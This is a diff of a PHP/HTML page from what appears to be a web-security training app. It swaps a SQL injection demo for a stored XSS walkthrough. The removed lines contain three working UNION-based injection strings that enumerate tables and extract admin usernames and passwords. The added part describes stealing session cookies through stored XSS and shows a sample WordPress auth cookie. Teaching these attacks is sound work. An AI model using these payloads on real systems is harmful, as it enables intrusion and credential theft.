@@ -13,89 +13,63 @@
 </header>
 
 
+<div class="container exploit-tabs">
+  <ul class="nav nav-tabs">
+    <li><a href="/a2/">Exploit Details</a></li>
+    <li class="active"><a href="/a2/example_1">"Stored XSS" Playground</a></li>
+  </ul>
+</div>
+
+
 <div class="container">
 
 <section>
-  
-  <form class="form-search" method="POST">
-    <input type="text" id="s" name="s" class="input-medium search-query" style="width:90%;" value="<?=$search;?>" />
-    <button type="submit" class="btn">Search</button>
-
-    <?php if( $query ){?>
-      <p style="margin-top:10px;">
-        <h3>Your query:</h3> 
-        <?=$query;?>
-      </p>
-    <?php } ?>
-
-  </form>
-  <p class="exploits" id="exploit_1" style="display:none;">
-    First we want to list out all the tables so we can find the "Admins" table
-    <br />
-    SELECT DATABASE() FROM DUAL <== Query to use the currecntly selected database name
-  </p>
-  <p class="exploits" id="exploit_2" style="display:none;">
-    Now that we know the admins Table we want to know what columns there are
-  </p>
-  <p class="exploits" id="exploit_3" style="display:none;">
-    Now that we know the columns lets grab all the Super Admins, cause that sounds fun!
-  </p>
-  <p class="exploits">
-    <a href="#" class="btn" onclick="example_exploit( 1 );" >Exploit #1</a>
-
-    <a href="#" class="btn" onclick="example_exploit( 2 );" >Exploit #2</a>
-
-    <a href="#" class="btn" onclick="example_exploit( 3 );" >Exploit #3</a>
-  </p>
-  <script>
-    function example_exploit( id ){
-      var exploit_1 = "0' UNION SELECT table_name, table_name, table_name FROM INFORMATION_SCHEMA.tables WHERE table_schema = ( SELECT DATABASE() FROM DUAL ) AND table_name LIKE '%";
-      var exploit_2 = "0' UNION SELECT column_name, column_name, column_name FROM INFORMATION_SCHEMA.columns WHERE table_name = 'admins' AND column_name LIKE '%";
-      var exploit_3 = "0' UNION SELECT id, username, password FROM admins WHERE super_admin = '1' AND username LIKE '%";
-
-      $('.exploits').hide();
-
-      if ( id == 1 ){
-        $('#s').val( exploit_1 );
-        $('#exploit_1').show();
-      }else if ( id == 2 ){
-        $('#s').val( exploit_2 );
-        $('#exploit_2').show();
-      }else if ( id == 3 ){
-        $('#s').val( exploit_3 );
-        $('#exploit_3').show();
-      }
-
+  <h4>Stored XSS Attack walk through</h4>
+  <style>
+    .example td{
+      vertical-align:middle
     }
-  </script>
-  <h3>Results</h3>
-  
-  <table class="table table-striped table-bordered">
-    <thead>
-      <tr>
-        <th>id</th>
-        <th>Name</th>
-        <th>Date Added (Timestamp)</th>
-        <th>Actions</th>
-      </tr>
-    </thead>
-    <?php if($results){ ?>
-      <?php foreach($results as $result){?>
-        <tr>
-          <?php foreach( $result as $value){ ?>
-            <td><?= $value;?></td>
-          <?php } ?>
-          <td style="text-align:center;">
-            <a href="#<?=$result->id;?>" class="btn" title="Details">View More</a>
-          </td>
-        </tr>
-      <?php } ?>
-    <?php }else{ ?>
-      <tr>
-        <td colspan="4" style="text-align:center;">No results Found</td>
-      </tr>
-    <?php } ?>
+  </style>
+  <table class="table example" style="width:100%">
+    <tr>
+      <td><a href="/a2/example_1_a" target="_blank" class="btn" style="width:100px;">Form Page</a></td>
+      <td >
+        First they find a field that they can exploit. 
+        <br /><br /><br />
+        They then save the XSS payload in the field.
+      </td>
+      <td><img src="/assets/images/a2/xss_how.png" style="width:500px;" /></td>
+    </tr>
+    <tr>
+      <td>&nbsp;</td>
+      <td colspan="2">The XSS payload is then saved in the database</td>
+    </tr>
+    <tr>
+      <td><a href="/a2/example_1_b" target="_blank" class="btn" style="width:100px;">Display Page</a></td>
+      <td>
+        They payload is then "echoed" on the page every place that that particular field is shown.
+        <br /><br /><br />
+        This then infects any browser viewing this page.
+      </td>
+      <td>
+        <pre class="prettyprint">&#60;?php echo s( $user->name );?></pre>
+        <img src="/assets/images/a2/xss_what.png" style="width:500px;" />
+      </td>
+    </tr>
+    <tr>
+      <td><a href="/a2/example_1_c" target="_blank" class="btn" style="width:100px;">Payload Page</a></td>
+      <td>
+        Why would they do this?
+        <br /><br />
+        Now all they need to do is copy and paste this session cookie and they gain all the rights and permissions you have.
+      </td>
+      <td>
+        <img src="/assets/images/a2/xss_why.png" style="width:500px;" />
+        <pre class="prettyprint">wordpress_logged_in_cef0b81c097b1bbcab03e88c1affb967=administrator%7C1360474428%7C8db583006988ef318d72d416d149682f;</pre>
+      </td>
+    </tr>
   </table>
+</section>
   
 
 </section>
